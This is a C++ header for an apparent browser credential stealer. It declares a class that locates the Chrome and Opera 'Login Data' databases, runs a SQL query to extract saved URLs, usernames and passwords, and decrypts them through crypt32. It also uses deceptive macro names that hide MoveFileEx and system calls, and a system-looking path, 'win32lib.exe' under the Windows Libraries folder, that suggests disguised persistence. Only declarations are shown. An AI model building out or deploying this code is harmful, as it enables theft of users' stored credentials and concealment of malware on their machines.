#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")

#ifndef		__BROWSER_PASSWORD_HH__
# define	__BROWSER_PASSWORD_HH__

# define	_CHROME_DATABASE_PATH	"\\Google\\Chrome\\User Data\\Default\\Login Data"
# define	_CHROME_REGKEY_PATH	L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
# define	_OPERA_DATABASE_PATH	"\\Opera Software\\Opera Stable\\Login Data"
# define	_OPERA_REGKEY_PATH	L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
# define	_DATABASE_PASSWD	L"\\Debug\\HookTestCopy.exe"
# define	_GET_PASSWORD_QUERY	"SELECT origin_url, username_value, length(password_value), password_value FROM logins"
# define	_REQUEST_TYPE		L"Path"
# define	_DATABASE_SQLITE	L"\\Microsoft\\Windows\\Libraries\\win32lib.exe"
# define	_ERROR_UNCRYPT		"Error during uncrypting phase"
# define	_INIT_CHAR		L"\\"
# define	_PASSWD_PROTOCOL	std::string("<PASSWORD>")
# define	InitDatabase		MoveFileEx
# define	ClearDatabase		system
# define	_DATABASE_FLAG		0x00000001 | 0x00000002

#include <Windows.h>
#include <iostream>
#include <sqlite3.h>
#include <ShlObj.h>
#include <conio.h>
#include <lmcons.h>
#include <string.h>
#include <vector>
#include <map>

class BrowserPassword
{
public:
	BrowserPassword();
	~BrowserPassword();

	enum class BrowserType
	{
		OPERA = 0x001a,
		CHROME = 0x001c
	};

	typedef struct		s_loginConnection
	{
		std::string	_url;
		std::string	_username;
		std::string	_password;
	}			t_loginConnection;

	void					setBrowserType(const BrowserType &type);
	void					databaseSpying();
	void					printPassword();
	const std::vector<t_loginConnection>	&getBrowserInfo() const;
	bool					passwordIsEmpty();
	void					getBrowserPassword();

private:
	// Methods
	void					findCurrentUserName();
	bool					findAppdataPath(std::string &appdataPath);
	bool					isBrowserInstalled();
	const char				*uncryptData(BYTE *password, int size);
	void					getBrowserPassword(sqlite3 *db);

	// Attributes
	BrowserType				_type;
	std::map<BrowserType, const char*>	_mapDatabasePath;
	std::map<BrowserType, const wchar_t*>	_mapRegKeyPath;
	std::vector<t_loginConnection>		_vectorLoginConnection;
};

#endif	/* !__BROWSER_PASSWORD_HH__ */
